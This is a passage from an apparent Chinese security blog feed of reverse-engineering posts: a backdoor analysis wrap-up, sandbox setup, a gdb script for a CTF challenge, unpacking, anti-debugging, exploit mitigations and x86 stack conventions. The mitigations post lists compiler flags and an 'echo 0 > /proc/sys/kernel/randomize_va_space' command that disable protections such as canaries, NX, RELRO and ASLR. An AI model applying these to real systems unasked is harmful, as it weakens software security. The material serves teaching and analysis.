title="说在最后"></a>说在最后</h1><p>程序的每一次运行效果并不完全相同，怀疑与后台设定的telegram机器人相关。第一次沙箱中运行之后开启了大量cmd窗口，在数据包中同时发现了<code>COMMAND::&lt;forkbomb&gt;-DATA::&lt;&gt;</code>编码之后的数据，之后重新运行未发生大量cmd窗口的情况，数据包中也未出现“forkbomb”相关字样。下图为某次本地运行之后的效果，恶意程序启动了系统中的一些程序来试图转移注意力</p><div align=center><img src="./本地某次运行效果.png" alt="本地某次运行效果"   /></div><h2 id="最后的最后"><a href="#最后的最后" class="headerlink" title="最后的最后"></a>最后的最后</h2><p>按照常理来说恶意软件分析应该重点关注程序的执行效果，带来的影响，但是第一次的分析感觉有点偏，总结写的也不是太好，思路混乱</p>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
          <category> 恶意程序分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Backdoor </tag>
            
            <tag> Malware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意程序分析环境搭建</title>
      <link href="/2020/04/12/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/04/12/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用Windows10搭建了一个分析环境，inetsim直接安装在了WSL上，因为两个系统公用一个ip所以无需更多配置。ApateDNS的返回ip填写<code>127.0.0.1</code>即可。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>因为两个系统公用一套端口，而inetsim也提供DNS服务，有冲突，可能使ApateDNS获取不到DNS请求，两种解决办法：</p><ol><li>优先打开ApateDNS，再打开Linux的inetsim服务。</li><li>再配置文件<code>/etc/inetsim/inetsim.conf</code>中注释掉<code>start_service dns</code>，关闭其dns服务</li></ol><h1 id="虚拟机文件"><a href="#虚拟机文件" class="headerlink" title="虚拟机文件"></a>虚拟机文件</h1><p><a href="https://pan.baidu.com/s/1H0IoC3-5OyRQfWJy6D4XAw" target="_blank" rel="noopener">百度云</a><br>提取码：14uu </p>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
          <category> 恶意程序分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gdb自动化调试举例</title>
      <link href="/2020/04/08/gdb%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E8%AF%95%E4%B8%BE%E4%BE%8B/"/>
      <url>/2020/04/08/gdb%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E8%AF%95%E4%B8%BE%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="举例说明gdb脚本以及Python脚本的使用。"><a href="#举例说明gdb脚本以及Python脚本的使用。" class="headerlink" title="举例说明gdb脚本以及Python脚本的使用。"></a>举例说明gdb脚本以及Python脚本的使用。</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>以攻防世界reverse中的hackme题目为例，题目思路比较简单。就是异或计算。  </p><div align=center><img src="./IDA反编译.png" alt="IDA反编译" /></div>但是题目中有点陷阱，程序中只对字符串进行了10次比较，达不到其需要的字符串长度，需要更改循环次数以完成对输入的完整检查。  题中每次比较的位置是不定的，而且存在重复比较，若手动处理比较麻烦。<h2 id="gdb脚本"><a href="#gdb脚本" class="headerlink" title="gdb脚本"></a>gdb脚本</h2><p>预设了三个断点  </p><pre><code class="bash">def pos&gt; run&gt; set $i=100&gt; while($i)  &gt; set $tmp=$rax  &gt; c  &gt; set $target= $al;  &gt; c  &gt; set $tartget= $target ^ $dl;  &gt; printf &quot;pos:%d,target:%d &quot;,$tmp,$target  &gt; set $i--  &gt; c  &gt;end&gt;endpos</code></pre><h2 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h2><p>预设了三个断点  </p><pre><code class="python">import gdb#用户自定义命令需要继承gdb.Command类class Pos(gdb.Command):    def __init__(self):        super(self.__class__,self).__init__(&quot;pos&quot;,gdb.COMMAND_USER)  #注册改命令的名字    def invoke(self,args,from_tty):        ss=list(&quot;01234567890123456789012&quot;)  #生成一个随便的内容的列表        gdb.execute(&quot;run&quot;)        i=100        while i:            pos=gdb.parse_and_eval(&quot;$eax&quot;) # 获取寄存器的值            gdb.execute(&quot;c&quot;)            target=gdb.parse_and_eval(&quot;$al&quot;)            gdb.execute(&quot;c&quot;)            target=target ^ gdb.parse_and_eval(&quot;$dl&quot;)            gdb.execute(&quot;c&quot;)            ss[pos]=chr(target)            i-=1        print(&quot;flag: &quot;+&quot;&quot;.join(ss))Pos()  #注册该命令</code></pre><p>两秒出结果，舒服。</p><div align=center><img src="./flag.png" alt="flag" /></div>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> GDB </tag>
            
            <tag> Python </tag>
            
            <tag> Script </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下的加壳脱壳</title>
      <link href="/2020/03/13/%E5%8A%A0%E5%A3%B3%E8%84%B1%E5%A3%B3/"/>
      <url>/2020/03/13/%E5%8A%A0%E5%A3%B3%E8%84%B1%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="IAT"><a href="#IAT" class="headerlink" title="IAT"></a>IAT</h1><p>IAT(Input Address Table),输入地址表。通俗的讲，IAT中存放了程序执行所用到的外部API的地址。与之对应的显然就还有输出地址表，存放着文件给外部使用的API的地址。现阶段的加壳脱壳中，更多的关注的是IAT。</p><h1 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h1><p>一段专门负责保护软件不被非法修改或反编译的程序，一般先于程序运行。</p><h2 id="壳的分类"><a href="#壳的分类" class="headerlink" title="壳的分类"></a>壳的分类</h2><h3 id="压缩壳"><a href="#压缩壳" class="headerlink" title="压缩壳"></a>压缩壳</h3><p>压缩壳的主要目的是缩减软件大小，例如<code>upx</code>、<code>ASPack</code>等等，脱起来也比较简单，可利用现有的脚本脱，也可手动脱</p><h3 id="加密壳"><a href="#加密壳" class="headerlink" title="加密壳"></a>加密壳</h3><p>加密壳侧重于保护软件，例如加密核心算法，或者限制软件使用等等。</p><ol><li>常见的<code>ASprotect</code>通过强有力的加密算法，来加密程序，官方提供相关的SDK，倡导开发者尽量使用SDK来开发。</li><li><code>Armadillo穿山甲</code>将程序中的所有跳转指令替换为int3指令，当子进程遇到int3异常时，父进程截获异常并计算出跳转的目标地址，然后返回给子进程继续运行。</li></ol><h3 id="虚拟机保护"><a href="#虚拟机保护" class="headerlink" title="虚拟机保护"></a>虚拟机保护</h3><p>这个就最厉害了，虚拟机拥有一套自定义的指令系统，首先将已知的指令集替换为自己的指令集，然后在运行时，自定义的指令集将在虚拟的cpu中运行。</p><h2 id="壳的加载过程"><a href="#壳的加载过程" class="headerlink" title="壳的加载过程"></a>壳的加载过程</h2><h3 id="1-保存入口参数"><a href="#1-保存入口参数" class="headerlink" title="1. 保存入口参数"></a>1. 保存入口参数</h3><p>加壳程序在初始化之前会保存当前的运行环境，以便外壳执行完毕之后方便程序继续执行。</p><h3 id="2-获取外壳所需的API地址"><a href="#2-获取外壳所需的API地址" class="headerlink" title="2. 获取外壳所需的API地址"></a>2. 获取外壳所需的API地址</h3><p>一般情况下，外壳的输入表中只有<code>GetProcAddress</code>，<code>GetModuleHandle</code>，<code>LoadLibrary</code>三个函数，甚至只有<code>Kernel32.dll</code>和<code>GetProcAddress</code>，所需要的其他函数将通过现有的函数进行加载、查询使用。</p><h3 id="3-解密原程序各个区块的数据"><a href="#3-解密原程序各个区块的数据" class="headerlink" title="3. 解密原程序各个区块的数据"></a>3. 解密原程序各个区块的数据</h3><p>一般来说各个数据按照区块来进行解密，但是也有程序用到哪就解密哪，增加分析难度。</p><h3 id="4-IAT的初始化"><a href="#4-IAT的初始化" class="headerlink" title="4. IAT的初始化"></a>4. IAT的初始化</h3><p>外壳程序将PE头中的输入表指针指向自建的输入表，该表由PE装载器负责填充，原程序的输入表将由外壳程序来进行维护。</p><h3 id="5-重定位项的处理"><a href="#5-重定位项的处理" class="headerlink" title="5. 重定位项的处理"></a>5. 重定位项的处理</h3><p>外壳程序的重定位主要由系统的提供实现，但原程序的代码就可能需要修复重定位，可以取消原程序的重定位，或者原程序的重定位段交由外壳程序进行修复重定位。</p><h3 id="6-恢复原程序的执行环境"><a href="#6-恢复原程序的执行环境" class="headerlink" title="6. 恢复原程序的执行环境"></a>6. 恢复原程序的执行环境</h3><h3 id="7-跳转到原程序的入口开始执行"><a href="#7-跳转到原程序的入口开始执行" class="headerlink" title="7. 跳转到原程序的入口开始执行"></a>7. 跳转到原程序的入口开始执行</h3><h1 id="脱壳（一般情况）"><a href="#脱壳（一般情况）" class="headerlink" title="脱壳（一般情况）"></a>脱壳（一般情况）</h1><p>一般情况下的脱壳大致步骤如下</p><h2 id="1-寻找OEP"><a href="#1-寻找OEP" class="headerlink" title="1. 寻找OEP"></a>1. 寻找OEP</h2><p>OEP(Original Entry Point),程序入口点。简单的外壳程序跳转到OEP时意味着此时内存中的原程序已经完成了脱壳。那寻找OEP的方法一般如下：</p><ol><li>根据跨段指令。外壳程序的指令可能运行在自定义的段中，完成解密之后，将跳转到.text段开始执行原程序，由此可知跳转之后的地址即为OEP。</li><li>使用内存访问断点。外壳程序在解密过程中，将对原程序的所有内存进行一次访问解密，当再次访问原程序的.text段时，说明此时开始执行原程序代码。</li><li>根据栈平衡原理。原程序在运行之前，外壳程序必须先恢复之前原有的堆栈环境。通过观察明显的<code>pushad/popad</code>、<code>pushfd\pofd</code>等指令，或对ESP设置硬件访问断点，于是可找到OEP</li></ol><h2 id="2-抓取内存映像"><a href="#2-抓取内存映像" class="headerlink" title="2. 抓取内存映像"></a>2. 抓取内存映像</h2><p>完成了OEP的寻找之后，执行到OEP时，原程序已经完成了解密，通过抓取内存壳得到原程序。<br>这一操作更多的依赖于<code>LordPE</code>,<code>PETools</code>等工具，主要通过<code>Module32Next</code>函数获取进程的有关信息，然后选取数据保存。保存的数据其实包含了外壳程序。这些工具在保存时一般默认重建了PE头，修改了OEP。<br>当然有一些anti-dump操作，比如修改系统中<code>modBaseSize</code>的值，或是修改内存属性不让读取等等，可以通过手动纠正映像大小，修改内存属性等绕过。</p><h2 id="3-重建IAT"><a href="#3-重建IAT" class="headerlink" title="3. 重建IAT"></a>3. 重建IAT</h2><p>上述操作完成之后得到了新的PE文件，但是并不能执行，因为程序中所有使用的API的地址都未知，也就是说IAT表没有修复，程序无法使用API。<br>这一过程也是使用工具完成，如<code>ImportREC</code>。IAT是一般一块连续的数据，以00作为结尾，当遇到多块IAT时，工具只能检测到一块，其余可能需要手动调整IAT地址和大小获取各个IAT数据。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://bbs.pediy.com/thread-20366.htm" target="_blank" rel="noopener">脱壳入门初级教学</a><br>《加密与解密 第四版》</p>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>调试与反调试</title>
      <link href="/2020/03/13/%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
      <url>/2020/03/13/%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>说到调试，最明显的工作就是将程序拖入、附加到调试器中，但是中间存在什么样的原理呢  </p><h2 id="创建附加被调试进程"><a href="#创建附加被调试进程" class="headerlink" title="创建附加被调试进程"></a>创建附加被调试进程</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>由<code>DbgUiConnectToDbg</code>函数调用<code>ZwCreateDebugObject</code>创建一个调试对象，并将调试对象句柄保存在调试器当前线程的TEB结构的DbgSsReserved[1]中。然后在<code>CreateProcess</code>创建进程时添加标志DEBUG_PROCESS即可完成创建被调试对象，也可以使用<code>DebugActiveProcess</code>附加到一个现有的进程上。  </p><pre><code class="C++">BOOL WaitForDebugEvent(  LPDEBUG_EVENT lpDebugEvent,   //指向DEBUG_EVENT结构的指针，该 结构接收有关调试事件的信息。  DWORD         dwMilliseconds  //等待调试事件的毫秒数。如果此参数为零，则该函数将测试调试事件并立即返回。如果参数为INFINITE，则在发生调试事件之前该函数不会返回。);</code></pre><p><code>WaitForDebugEvent</code>用于等待和接收调试事件,处理调试事件后，调试器调用<code>ContinueDebugEvent</code>将处理结果回复给调试子系统。</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Linux下的调试工具gdb主要依赖<code>ptrace</code>，<code>ptrace</code>可以让父进程观察子进程的执行，可以改变子进程的内存和寄存器</p><h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><h3 id="软件断点"><a href="#软件断点" class="headerlink" title="软件断点"></a>软件断点</h3><p>通过在代码中设置特定值的方式实现的，比如说Windows下断点处的指令将会被变为int3，到达断点处之后，调试器通过对比现有的断点列表得知其为用户断点，于是在程序被中断到调试器之前，将int3代码替换为原来的代码，再将控制权交给用户。当用户期望恢复执行被调试进程时，调试器通过API通知调试子系统，然后系统内核的异常分发函数将返回到异常处理函数，处理函数再通过<code>IRET/IRETD</code>指令发出异常返回工作，恢复CPU的上下文，从中断处继续执行。</p><h3 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h3><p>硬件中断主要通过DR0-DR3调试地址寄存器、DR6调试控制寄存器以及RD7调试状态寄存器实现的。DR0-DR3保存了制定断点的内存或IO地址.当调试发生时，DR6将用来报告调试器更加详细的信息。DR7则用来保存各个硬件断点的中断条件。</p><h2 id="单步执行"><a href="#单步执行" class="headerlink" title="单步执行"></a>单步执行</h2><p>单步执行主要是通过eflags寄存器上的TF位来实现的。当TF为1时，单步中断，执行完一条语句之后将发生异常，进入异常处理函数之后TF为将自动置0.</p><h3 id="单步进入"><a href="#单步进入" class="headerlink" title="单步进入"></a>单步进入</h3><p>在执行指令时，通过调试符号获取当前位置的行信息，再通过TF位单步异常之后对比前后位置行信息即可。</p><h3 id="单步跳过"><a href="#单步跳过" class="headerlink" title="单步跳过"></a>单步跳过</h3><p>执行不包含call的指令时，原理与单步进入是一样的。在执行包含call指令的语句时，则在下一条指令设置断点，然后继续运行，对比前后位置行信息即可。</p><h1 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><ol><li><code>IsDebuggerPresent</code></li><li><code>CheckRemoteDebuggerPresent</code> </li><li><code>NtQueryInformationProcess</code>在参数中可以要求返回调试端口</li><li><code>ZwSetInformationThread</code>可以要求分离，终止被调试的进程</li></ol><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol><li>窗口信息</li><li>注册表</li><li>代码校验和</li><li>硬件断点</li><li>时钟检测</li><li>……</li></ol><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><ol><li><a href="https://b0ldfrev.gitbook.io/note/windows_operating_system/tiao-shi-yuan-li" target="_blank" rel="noopener">调试原理</a></li><li><a href="https://bbs.pediy.com/thread-225740.htm" target="_blank" rel="noopener">反调试技术总结</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> AntiDebug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows、Linux程序常见的保护机制</title>
      <link href="/2020/03/04/Windows%E3%80%81Linux%E7%A8%8B%E5%BA%8F%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2020/03/04/Windows%E3%80%81Linux%E7%A8%8B%E5%BA%8F%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>简单介绍一些Windows、Linux下的程序常见的保护机制对应的编译选项</p><h1 id="windows平台"><a href="#windows平台" class="headerlink" title="windows平台"></a>windows平台</h1><h2 id="GS与变量重排技术"><a href="#GS与变量重排技术" class="headerlink" title="GS与变量重排技术"></a>GS与变量重排技术</h2><h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h3><p>主要用于防止栈溢出。调用函数时，在压入EBP之前，也就是紧邻EBP的低地址中将存放一个Security Cookie，即一个随机数。该随机数由.data字节的第一个QWORD作为种子生成。在函数返回之前，对Cookie进行检查，如果不对，则表明存在溢出，将发起异常，由对应的异常处理函数来进行处理，然后退出。<br>编译选项为：vs中项目/**属性/配置属性/c++/代码生成/缓冲区安全检查  </p><h3 id="变量重排技术"><a href="#变量重排技术" class="headerlink" title="变量重排技术"></a>变量重排技术</h3><p>在编译时，根据局部变量的类型对变量在栈中的位置进行调整，将字符变量移动到高地址等等措施方式局部变量被溢出修改</p><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><p>在程序调用异常处理函数之前，对要调用的函数进行一系列的有效性校验，当函数发现不可靠时将终止异常处理函数的调用，以防止SEH(Struct Exception Handler)的恶意利用。该功能需要操作系统与编译器的支持。<br>大致流程：  </p><ol><li>检查异常处理链是否在当前栈中</li><li>检查异常处理函数指针是否指向当前栈中</li><li>调用<code>RtlIsValidHandler()</code>函数进行相关检测</li></ol><div align=center><img src="./RtlIsVaildHandler校验流程.jpg" alt="RtlIsValidHandler校验流程"  /></div><h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><p>DEP(Data Execution Prevention)，数据执行保护，将数据页标记为不可执行，当去数据页执行时，引发异常。<br>系统提供<code>VirtualProtect</code>等等函数来让程序手动修改页属性<br>编译选项：vs中项目/**属性/配置属性/链接器/高级/数据执行保护  </p><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>ASLR(Address Space Layout Randomization),内存随机化保护机制。在PE头中<code>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE</code>标志是否支持ASLR。<br>编译选项：vs中项目/**属性/配置属性/链接器/高级/随机基址<br>注册表中键值<code>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\MoveImages</code>将影响系统ASLR支持：  </p><ol><li>0映像随机化将禁用</li><li>-1强制进行处理</li><li>其他正常工作，依赖标识选择处理</li></ol><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><p>SEHOP(Structured Exception Handling Overwrite Protection),它将检查SEH链的完整性，其会检查SEH链的末端是否为系统固定的终极异常处理函数。<br>注册表中的键值<code>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\kernel\DisableExceptionChainValidation</code>将影响系统SHEOP支持  </p><h1 id="Linux平台"><a href="#Linux平台" class="headerlink" title="Linux平台"></a>Linux平台</h1><h2 id="CANARY"><a href="#CANARY" class="headerlink" title="CANARY"></a>CANARY</h2><p>与Windows下的GS类似，通过验证canary的值来判断栈是否溢出。<br>gcc编译选项： </p><ol><li>默认不开启canary保护</li><li><code>-fstack-protector-all</code>为所有函数提供保护</li><li><code>-fstack-protector</code>为使用alloca或本地缓冲区大于8的函数提供保护</li><li><code>--param ssp-buffer-size=4</code>设定不提供保护的函数缓冲区下限</li><li><code>-fno-stack-protector</code>禁用canary保护</li></ol><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>Fortify能够轻微的检测对内存和字符串操作的函数的缓冲区溢出问题，目前支持的一些函数有<code>memcpy</code>, <code>mempcpy</code>, <code>memmove</code>, <code>memset</code>, <code>strcpy</code>, <code>stpcpy</code>, <code>strncpy</code>, <code>strcat</code>, <code>strncat</code>, <code>sprintf</code>, <code>vsprintf</code>, <code>snprintf</code>, <code>vsnprintf</code>, <code>gets</code>等等<br>gcc编译选项：</p><ol><li>默认不开启</li><li><code>-D_FORTIFY_SOURCE=1</code>配合优化<code>-O1</code>使用，程序在编译时进行检查但是不改变程序功能</li><li><code>-D_FORTIFY_SOURCE=2</code>，添加新的检查功能，运行时检查，检查异常失败将运行时错误</li></ol><h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>类似Windows下的DEP，Linux下系统提供mprotect等函数来允许程序手动修改页的相关属性。<br>gcc编译选项：</p><ol><li>默认开启NX保护</li><li><code>-z execstack</code>禁用NX保护</li><li><code>-z noexecstack</code>开启NX保护</li></ol><h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><h3 id="PIC"><a href="#PIC" class="headerlink" title="PIC"></a>PIC</h3><p>PIC(Position-indenpendent Code),位置无关代码技术。PIC主要解决共享对象指令和可执行文件中对绝对地址的重定位问题</p><h3 id="PIE-1"><a href="#PIE-1" class="headerlink" title="PIE"></a>PIE</h3><p>PIE(Position-indenpendent Executable),类似ASLR，内存地址随机化机制，一个以地址无关方式编译的可执行文件被称作为地址无关可执行文件。<br>系统选项：<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>禁用PIE功能  </p><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELRO( Relocation Read-Only),在动态链接的ELF文件中，往往使用got表来动态解析共享库中的函数，而延时绑定技术将在程序运行过程中根据需要查找定位函数，使得got在整个过程中是可写的，这样可能使得got表覆盖而执行任意代码。而RELRO将使程序在开始执行前，解析所有动态链接的函数，然后将got表设置为只读，如此为完全的RELRO保护。而部分的RELRO保护只保护非PLT部分（即.got只读，但是.got.plt可写）<br>gcc编译选项：</p><ol><li>默认部分开启</li><li><code>-z norelro</code>关闭RELRO防护</li><li><code>-z lazy</code>部分开启</li><li><code>-z now</code>开启全部防护</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">linux程序的常用保护机制</a><br><a href="https://en.wikipedia.org/wiki/Buffer_overflow_protection" target="_blank" rel="noopener">Buffer overflow protection</a><br><a href="https://lwn.net/Articles/584225/" target="_blank" rel="noopener">“Strong” stack protection for GCC</a><br><a href="https://access.redhat.com/blogs/766093/posts/1976213" target="_blank" rel="noopener">Enhance application security with FORTIFY_SOURCE</a><br><a href="http://man7.org/linux/man-pages/man2/mprotect.2.html" target="_blank" rel="noopener">mprotect(2) - Linux manual page - man7.org</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect" target="_blank" rel="noopener">VirtualProtect function</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SecurityTechnologies </tag>
            
            <tag> OS </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈相关</title>
      <link href="/2020/03/03/%E6%A0%88%E7%9B%B8%E5%85%B3/"/>
      <url>/2020/03/03/%E6%A0%88%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><h2 id="栈-1"><a href="#栈-1" class="headerlink" title="栈"></a>栈</h2><p>限定仅在表尾进行插入和删除操作的线性表，栈常用的操作有压栈与弹栈，用于标识栈的属性有栈顶与栈底。<br>ESP寄存器保存着永远指向系统栈最上面一个栈帧的栈顶。<br>EBP寄存器保存着永远指向系统栈最上面一个栈帧的栈底。  </p><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>提到栈，想到的就是函数的调用</p><h3 id="jump与call的区别"><a href="#jump与call的区别" class="headerlink" title="jump与call的区别"></a>jump与call的区别</h3><p>jump是跳转到该地址开始执行。而执行完成之后的返回地址将由程序自行确定。<br>call是把下一条指令的地址压入栈之后再跳转执行，方便ret到正确的下一条指令，中间涉及到堆栈平衡的操作。</p><h3 id="C-中函数调用约定"><a href="#C-中函数调用约定" class="headerlink" title="C++中函数调用约定"></a>C++中函数调用约定</h3><table><thead><tr><th align="left">调用惯例</th><th align="left">堆栈平衡维护</th><th align="left">参数传递</th><th align="left">名字修饰</th></tr></thead><tbody><tr><td align="left">cdecl（C++默认）</td><td align="left">主调函数</td><td align="left">从右往左</td><td align="left">下划线＋函数名</td></tr><tr><td align="left">stdcall</td><td align="left">被调函数</td><td align="left">从右往左</td><td align="left">下划线+函数名+@+参数的字节总数<br>如“int func(int a,double b)”的修饰名是“_func@12”</td></tr><tr><td align="left">fastcall</td><td align="left">被调函数</td><td align="left">优先存放2个到寄存器，然后从右往左</td><td align="left">@+函数名+@+参数的字节数</td></tr></tbody></table><h3 id="cdecl举例"><a href="#cdecl举例" class="headerlink" title="__cdecl举例"></a><a href="#__cdecl调用过程">__cdecl举例</a></h3><ol><li>常见的__cdecl为例，主调函数首先将参数从右往左压入栈</li><li>call指令执行，将函数的返回地址，也就是EIP压入栈，把EIP设置为函数的起始地址</li><li>将主调函数的栈帧底压入栈</li><li>将ESP赋值给EBP，设置帧基指针</li><li>然后抬高栈顶，为变量分配空间</li><li>有需要的话将寄存器的值再进行保存</li><li>函数ret之前，恢复之前保存的寄存器值</li><li>将EBP赋值给ESP，并弹栈赋值EBP，以返回主调函数栈帧</li><li>ret返回主调函数，弹出参数，恢复堆栈平衡继续执行</li></ol><h4 id="举例举例"><a href="#举例举例" class="headerlink" title="举例举例"></a>举例举例</h4><pre><code class="x86asm">   0x08048451 &lt;+0&gt;:    lea    ecx,[esp+0x4]      ；为了保存当前栈顶值   0x08048455 &lt;+4&gt;:    and    esp,0xfffffff0     ；这里不是太明白用处，可能也是为了抬高栈顶   0x08048458 &lt;+7&gt;:    push   DWORD PTR [ecx-0x4]   0x0804845b &lt;+10&gt;:    push   ebp   0x0804845c &lt;+11&gt;:    mov    ebp,esp   0x0804845e &lt;+13&gt;:    push   ecx                ；压栈，保存ecx的值，以便之后恢复堆栈平衡   0x0804845f &lt;+14&gt;:    sub    esp,0x4            ；抬高栈顶，为函数的局部变量分配空间   0x08048462 &lt;+17&gt;:    call   0x804847f &lt;__x86.get_pc_thunk.ax&gt;    ；与PIC技术相关，获取代码位置，用以地址无关代码。函数执行的结果是返回EIP的值   0x08048467 &lt;+22&gt;:    add    eax,0x1b99   0x0804846c &lt;+27&gt;:    call   0x8048426 &lt;print()&gt;   0x08048471 &lt;+32&gt;:    mov    eax,0x0   0x08048476 &lt;+37&gt;:    add    esp,0x4            ；栈空间释放   0x08048479 &lt;+40&gt;:    pop    ecx                ；弹出保存的寄存器的值   0x0804847a &lt;+41&gt;:    pop    ebp                    0x0804847b &lt;+42&gt;:    lea    esp,[ecx-0x4]      ；恢复完主调函数的帧基指针   0x0804847e &lt;+45&gt;:    ret </code></pre><h3 id="有关栈平衡"><a href="#有关栈平衡" class="headerlink" title="有关栈平衡"></a>有关栈平衡</h3><p>栈平衡不仅仅是返回之后EBP更改为主调函数的栈基指针，而且要求栈帧中不在包含调用函数时压入的参数，如此才为平衡。</p><pre><code class="c++">int  __attribute__((stdcall))  print(int a,int b,int c){    return a+b+c;}int  __attribute__((cdecl))  print(int a,int b,int c){    return a+b+c;}</code></pre><p>__stdcall约定方式</p><pre><code class="x86asm">   0x08048426 &lt;+0&gt;:    push   ebp   0x08048427 &lt;+1&gt;:    mov    ebp,esp   0x08048429 &lt;+3&gt;:    call   0x8048493 &lt;__x86.get_pc_thunk.ax&gt;   0x0804842e &lt;+8&gt;:    add    eax,0x1bd2   0x08048433 &lt;+13&gt;:    mov    edx,DWORD PTR [ebp+0x8]   0x08048436 &lt;+16&gt;:    mov    eax,DWORD PTR [ebp+0xc]   0x08048439 &lt;+19&gt;:    add    edx,eax   0x0804843b &lt;+21&gt;:    mov    eax,DWORD PTR [ebp+0x10]   0x0804843e &lt;+24&gt;:    add    eax,edx   0x08048440 &lt;+26&gt;:    pop    ebp   0x08048441 &lt;+27&gt;:    ret    0xc</code></pre><p>__cdecl约定方式</p><pre><code class="x86asm">   0x08048426 &lt;+0&gt;:    push   ebp   0x08048427 &lt;+1&gt;:    mov    ebp,esp   0x08048429 &lt;+3&gt;:    call   0x8048494 &lt;__x86.get_pc_thunk.ax&gt;   0x0804842e &lt;+8&gt;:    add    eax,0x1bd2   0x08048433 &lt;+13&gt;:mov    edx,DWORD PTR [ebp+0x8]   0x08048436 &lt;+16&gt;:mov    eax,DWORD PTR [ebp+0xc]   0x08048439 &lt;+19&gt;:add    edx,eax   0x0804843b &lt;+21&gt;:mov    